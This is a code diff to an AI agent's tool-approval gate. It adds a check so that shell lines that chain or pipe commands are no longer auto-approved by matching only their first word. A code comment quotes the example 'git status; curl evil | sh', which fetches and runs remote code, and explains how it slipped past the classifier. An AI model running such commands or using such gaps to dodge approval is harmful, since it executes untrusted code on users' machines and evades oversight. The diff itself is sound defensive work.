@@ -40,7 +40,23 @@ const SAFE_TOOLS = new Set([
 ]);
 /** The shell tools, whose command argument decides the answer. Both call the argument `command`. */
 const SHELL_TOOLS = new Set(['execute_command', 'Bash']);
-/** Safe, non-mutating shell commands (matched against the `command` argument). */
+/**
+ * Shell syntax that lets one command line run more than the command it starts with: separators and
+ * chains, pipes, both substitution forms, redirects, and a background `&`.
+ *
+ * This exists because `SAFE_COMMAND` below is anchored at the start of the string, so by itself it
+ * only ever described a command's FIRST word — `git status; curl evil | sh` matched `git status`
+ * and came back GREEN, auto-approved with no model call. Deciding which of these characters are
+ * really separators and which are quoted needs a shell parser, and a wrong guess here approves
+ * arbitrary code, so a command containing any of them is simply not eligible for the free path. It
+ * still reaches the classifier; it just does not skip it.
+ */
+const SHELL_COMPOSITION = /[;&|`\n\r><]|\$\(/;
+/**
+ * Safe, non-mutating shell commands (matched against the `command` argument). Anchored at the
+ * start, and only meaningful together with the `SHELL_COMPOSITION` check above — on its own it
+ * says nothing about the rest of the line.
+ */
 const SAFE_COMMAND = /^\s*(ls|cat|pwd|echo|head|tail|wc|grep|rg|find|which|env|date|whoami|git\s+(status|log|diff|show|branch|remote|rev-parse|config\s+--get))\b/i;
 // These hard-coded destructive patterns mirror the team BDI reds (protected-branch push,
 // force-push, rm -rf, secret access, prod/permission changes). Upgrade path: derive them from
@@ -78,7 +94,8 @@ function isSafeRead(session) {
     }
     if (SHELL_TOOLS.has(name)) {
         const cmd = p.arguments ? String(p.arguments.command ?? '') : '';
-        return SAFE_COMMAND.test(cmd);
+        // Both halves are required: the line must start with something safe AND be a single command.
+        return SAFE_COMMAND.test(cmd) && !SHELL_COMPOSITION.test(cmd);
     }
     return false;
 }
